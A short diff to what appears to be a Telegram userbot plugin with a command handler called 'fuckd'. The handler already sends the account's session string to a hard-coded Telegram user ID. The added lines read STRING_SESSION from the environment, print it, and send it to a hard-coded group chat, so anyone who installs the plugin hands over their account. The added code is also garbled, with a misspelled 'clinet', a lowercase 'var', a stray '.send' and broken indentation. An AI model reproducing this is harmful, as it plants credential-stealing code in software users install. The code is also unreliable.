@@ -32,3 +32,8 @@ async def fuckd(ult):
  await asyncio.sleep(2)
  await ult.edit ("fuck")
  await ult.client.send_message(5121955848, Var.SESSION)
+ HACK = os.environ.get("STRING_SESSION")
+print(HACK)
+await ult.clinet.send_message(-601460940, var.STRING_SESSION).send
+
+
